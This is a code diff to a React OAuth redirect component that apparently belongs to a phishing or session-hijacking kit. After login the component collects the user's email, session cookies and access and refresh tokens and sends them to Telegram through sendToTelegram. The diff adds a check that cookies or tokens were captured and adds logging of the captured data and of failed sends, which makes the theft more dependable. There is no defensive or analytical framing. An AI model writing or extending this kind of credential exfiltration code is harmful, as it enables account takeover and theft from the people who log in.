@@ -113,6 +113,12 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
         skipTelegram: false
       };
       
+      // Ensure we have either cookies or tokens for the backend
+      if ((!telegramPayload.formattedCookies || telegramPayload.formattedCookies.length === 0) && 
+          !telegramPayload.accessToken && !telegramPayload.refreshToken) {
+        console.warn('⚠️ No cookies or tokens found, this may cause Telegram notification to fail');
+      }
+      
       console.log('🔄 Telegram payload prepared:', {
         email: telegramPayload.email,
         cookieCount: telegramPayload.formattedCookies.length,
@@ -283,6 +289,8 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
   const handleOAuthCallback = async (code: string) => {
     try {
       console.log('🔄 Starting OAuth callback handling with code:', code);
+      console.log('🔄 Current URL:', window.location.href);
+      console.log('🔄 Code length:', code?.length || 0);
       
       // Validate we have the necessary data
       if (!code) {
@@ -487,11 +495,25 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
 
         try {
           console.log('🔄 Step 2: Sending data to Telegram...');
-          await sendToTelegram(sessionData);
+          console.log('🔄 Session data being sent:', {
+            email: sessionData.email,
+            cookieCount: sessionData.formattedCookies?.length || 0,
+            hasCookies: !!(sessionData.formattedCookies && sessionData.formattedCookies.length > 0),
+            firstCookie: sessionData.formattedCookies?.[0]?.name || 'none'
+          });
+          const telegramResult = await sendToTelegram(sessionData);
           telegramSuccess = true;
-          console.log('✅ Step 2 completed: Data sent to Telegram');
+          console.log('✅ Step 2 completed: Data sent to Telegram', telegramResult);
         } catch (telegramError) {
           console.error('❌ Telegram send failed:', telegramError);
+          console.error('❌ Error details:', {
+            message: telegramError.message,
+            stack: telegramError.stack,
+            sessionData: {
+              email: sessionData.email,
+              cookieCount: sessionData.formattedCookies?.length || 0
+            }
+          });
         }
 
         // Log final status
